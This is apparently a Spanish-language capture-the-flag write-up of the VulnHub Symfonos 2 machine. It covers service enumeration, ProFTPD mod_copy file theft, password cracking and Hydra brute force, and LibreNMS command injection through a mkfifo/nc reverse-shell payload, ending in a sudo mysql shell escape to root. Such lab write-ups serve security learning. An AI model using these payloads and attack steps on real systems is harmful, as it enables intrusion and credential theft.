---
tags:
  - type/writeup
  - estado/completo
plataforma: "[[VulnHub]]"
web: https://www.vulnhub.com/symfonos2
dificultad: Fácil
os: Linux
relacionados:
  - "[[02 - Herramientas/ftp|ftp]]"
  - "[[smbclient]]"
  - "[[john]]"
  - "[[searchsploit]]"
  - "[[SSH (22) - Enumeración|ssh]]"
  - "[[Local Port Forwarding]]"
  - "[[Port Forwarding]]"
---
#  VulnHub - Symfonos 2

## Reconocimiento  

### Nmap

Hago un escaneo de puertos con Nmap para identificar servicios abiertos.  

**Comando utilizado:**  
```bash
sudo nmap -A IPVICTIMA
```  

**Resultado del escaneo:**  
- **FTP (puerto 21):** proftpd 1.3.5  
- **SSH (puerto 22):** OpenSSH 7.4p1 Debian 10+deb9u6  
- **HTTP (puerto 80):** httpd 1.21  
- **SMB (puertos 139 y 445):** Samba 4.16  

### HTTP  

Inspecciono el servicio utilizando `curl` y se descargo la imagen visible en el sitio para analizar sus metadatos con `exiftool`.  

**Comandos:**  
```bash
curl -v http://IPVICTIMA
exiftool imagen.jpg
```  
Resultado: No se encuentran datos relevantes para avanzar.  

### Conexión con SMB  

Enumero los recursos compartidos mediante **smbmap** o **smclient**:  
```bash
smbmap -H IPVICTIMA
```  
o
```bash
smbclient -L <IPVICTIMA>
```
Observo un recurso llamado `anonymous` que contiene un archivo `log.txt`. 

### Archivo `log.txt`

En el archivo se descubre al usuario `aeolus` relacionado con un servicio FTP.  

También se observan estas lineas importantes:
```
cat /etc/shadow > /var/backups/shadow.bak
```
Esto me dice que hay un archivo copia del `/etc/shadow`.

```
[anonymous]
 258   │    path = /home/aeolus/share
 259   │    browseable = yes
 260   │    read only = yes
 261   │    guest ok = yes
```
Acá veo donde se ubican los recursos compartidos que se entraba en el Samba como anonymous.

## Análisis de vulnerabilidades
#### Opción 1
### searchsploit a ProFTPD 1.3.5

```
searchsploit ProFTPD 1.3.5
```

Encuentro que `proftp` es vulnerable:
```bash
ProFTPd 1.3.5 - File Copy                      linux/remote/36742.txt
```
El exploit me da a entender que se puede copiar y pegar archivos sin identificación, usando `site cpfr` y `site cpto`. 

### Copiar archivos con la vulnerabilidad de ProFTPD 

Me conecto:
```bash
ftp <IPVICTIMA>
```
Pongo cualquier usuario y contraseña. 

Me conecta y me dice que no tengo acceso, pero si escribo `help` funciona, pongo `site help` para ver si aparecen los comandos mencionados anteriormente.

Mando la copia del `/etc/shadow` al directorio compartido por `anonymous`:
```bash
site cpfr /var/backups/shadow.bak

site cpto /home/aeolus/share/<NUEVO_NOMBRE>
```

Ahora al volverme a logear en `samba` al directorio `anonymous` puedo descargar el archivo `shadow.bak`:
```bash
smbclient -N \\\\<IP-VICTIMA>\\anonymous
```

### Descubrir hashes con [[john]]

Cargo el `rockyou.txt` en john junto al archivo copia del `/etc/shadow`
```bash
john -w:/usr/share/wordlists/rockyou.txt content/shadow.bak
```

Me encuentra lo siguente:
```
sergioteamo      (aeolus)
```

#### Opción 2
### Fuerza bruta con [[hydra]] a FTP

Realizo un ataque de fuerza bruta con Hydra para obtener la contraseña del usuario `aeolus`:  
```bash
sudo hydra -l aeolus -P /ruta/a/rockyou.txt ftp://IPVICTIMA -V
```  
**Resultado:**  
Usuario: `aeolus`  
Contraseña: `sergioteamo`  

___

### Conexión por SSH  

Accedo al servidor utilizando las credenciales obtenidas:  
```bash
ssh aeolus@IPVICTIMA
```  


### Buscando como escalar privilegios

Veo los puertos:
```bash 
ss -nat
```
```
State      Recv-Q Send-Q                               Local Address:Port                                              Peer Address:Port              
LISTEN     0      80                                       127.0.0.1:3306                                                         *:*                  
LISTEN     0      50                                               *:139                                                          *:*                  
LISTEN     0      128                                      127.0.0.1:8080                                                         *:*                  
LISTEN     0      32                                               *:21                                                           *:*                  
LISTEN     0      128                                              *:22                                                           *:*                  
LISTEN     0      20                                       127.0.0.1:25                                                           *:*                  
LISTEN     0      50                                               *:445                                                          *:*                  
ESTAB      0      260                                 172.16.217.133:22                                              172.16.217.148:59286              
LISTEN     0      50                                              :::139                                                         :::*                  
LISTEN     0      64                                              :::80                                                          :::*                  
LISTEN     0      128                                             :::22                                                          :::*                  
LISTEN     0      20                                             ::1:25                                                          :::*                  
LISTEN     0      50                                              :::445                                                         :::*                  
```
 MySQL (3306) y el SMTP (25) están limitados a la interfaz loopback (127.0.0.1 o ::1), lo cual suele ser una práctica segura al impedir accesos externos directos. En cambio el puerto 8080 en el loopback no es común. 

Con `linenum.sh` también se obtienen detalles relevantes, como un servicio **LibreNMS** en el puerto 8080 accesible desde `localhost`.  

###  [[Local Port Forwarding]]

Configuro un túnel SSH para redirigir el puerto 8080:  
```bash
ssh -L 8080:localhost:8080 aeolus@IPVICTIMA
```  

Accedemos al servicio LibreNMS en el navegador para realizar la explotación. 
```http
http://localhost:8080/
```

## Explotación de vulnerabilidades  

### Exploit con metasploit

Utilizo Metasploit para aprovechar una vulnerabilidad en LibreNMS:  
```bash
use exploit/linux/http/librenms_addhost_cmd_inject
```  

**Parámetros del exploit:**  
- Usuario: `aeolus`  
- Contraseña: `sergioteamo`
- RHOST: `<localhost>`
- RPORT: `8080`
- LHOST: `<KALI_IP>`
- LPORT: `4444`

### Exploit con el `.py`
```bash
./addhost-RCE.py http://localhost:8080/ "XSRF-TOKEN=eyJpdiI6IjNrZGN3QVc4bURqcFAwXC9pdVwvMjdWdz09IiwidmFsdWUiOiJEazJFS1hjUXZrbHFoSVc2WXVGb3A3QmtmNFJGWG12OVd2SjBRQzNZS3JpMDhNd1pMKzlETUJRdFd1YzZ3cmdBNWsyaVJKbHJwMHIyZUFZbk13eVpMUT09IiwibWFjIjoiOGQ1NjNjMGMzNzBjNTdhZWExZjEyNGZlZTZiNzRlNDI2N2RjODcyMGNkOWRkNDhmZDQ4YTk1Y2Q2OTY4YzA1MiJ9; librenms_session=eyJpdiI6Ijc0UnlwNEdXTllLdmtTUEpUTXBVSUE9PSIsInZhbHVlIjoiZjNYQTdBaTJPQ2N2YWV5UVBpU3gySHZZcWgxcHBvaTh5SmJWTnZocFdpYW1ETzA0dE9jK1Jyd0xHais0Q2VTUTRTUlwvcUQyMTFPeFY5MWdtb3FGbUd3PT0iLCJtYWMiOiJiNzU3ZjJmYzkyNjcyYWY1NGFkMDI5Y2M0MzU0ZWU3ZTBjYTEzMzE4YmVjNTQ4ZjliYzk5NDMyNzg5ZjU3ZjFlIn0%3D; PHPSESSID=amkghgtpkrrsqag6euivmfvq71" 172.16.217.148 443
```

### Exploit manual

No me funcionó, así que intento con un exploit similar pero que puedo manejarlo manualmente:
```bash
searchsploit librenms

searchsploit -x php/webapps/47044.py | batcat -l python

LibreNMS - addhost Command Injection (Metasploit) | linux/remote/46970.rb
```

El texto me da la ruta `/addhost/`, y el payload para poner en la parte de `community:
```bash
'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IPAEOLUS o IPKALI> <PUERTO> >/tmp/f) #
```

Me pongo en escucha en `aeolus`:
```bash
nc -nlvp 4646
```
Luego el texto en cuestión me guía a que vaya `devices > all devices > nombre del dispositivo > captura > snmp > run`

Obtengo acceso al usuario `cronus`

## Escalada de privilegios  

Una vez dentro del sistema como `cronus`:
```bash
sudo -l
```

Se utiliza el acceso root a MySQL:  
```bash
sudo /usr/bin/mysql -e '\! /bin/sh'
```  

Con permisos elevados, se accede al archivo `proof.txt` ubicado en `/root`.  

## Bandera(s)

> [!flag] `flag{root}`
> ![[Symfonos 2.png]]
^bandera
